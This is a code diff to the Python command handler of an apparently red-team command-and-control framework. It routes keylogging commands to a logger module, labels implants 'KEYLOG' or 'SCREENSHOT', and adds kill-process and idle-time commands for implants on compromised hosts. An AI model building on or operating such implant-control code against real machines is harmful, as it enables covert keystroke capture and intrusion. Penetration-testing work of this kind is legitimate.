@@ -2,7 +2,7 @@ import base64, re, traceback, os, string, sys
 from Alias import cs_alias, cs_replace
 from Colours import Colours
 from Utils import validate_sleep_time
-from DB import new_task, update_sleep, unhide_implant, kill_implant, get_implantdetails, get_sharpurls, select_item, new_c2_message
+from DB import new_task, update_sleep, unhide_implant, kill_implant, get_implantdetails, get_sharpurls, select_item, new_c2_message, update_label
 from AutoLoads import check_module_loaded, run_autoloads_sharp
 from Help import sharp_help1
 from Config import POSHDIR, ROOTDIR, SocksHost, PayloadsDirectory
@@ -153,16 +153,26 @@ def handle_sharp_command(command, user, randomuri, startup, implant_id, commandl
             new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
 
     elif (command.startswith("stop-keystrokes")):
-        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
+        new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
+        update_label("", randomuri)
 
     elif (command.startswith("start-keystrokes")):
-        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
+        check_module_loaded("Logger.exe", randomuri, user)
+        new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
+        update_label("KEYLOG", randomuri)
 
     elif (command.startswith("get-keystrokes")):
+        new_task("run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
+
+    elif (command.startswith("kill-process")):
+        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
+
+    elif (command.startswith("get-idletime")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
 
     elif (command.startswith("get-screenshotmulti")):
         new_task(command, user, randomuri)
+        update_label("SCREENSHOT", randomuri)
 
     elif (command.startswith("create-lnk")):
         new_task("run-exe Core.Program Core %s" % command, user, randomuri)
@@ -258,12 +268,12 @@ def handle_sharp_command(command, user, randomuri, startup, implant_id, commandl
         print("")
         for mod in modules:
             if (".exe" in mod) or (".dll" in mod):
-                print(mod)
-        new_task("listmodules", user, randomuri)
+                print(mod)       
 
     elif command.startswith("modulesloaded"):
         ml = get_implantdetails(randomuri)
         print(ml[14])
+        new_task("listmodules", user, randomuri)
 
     elif command == "help" or command == "?":
         print(sharp_help1)
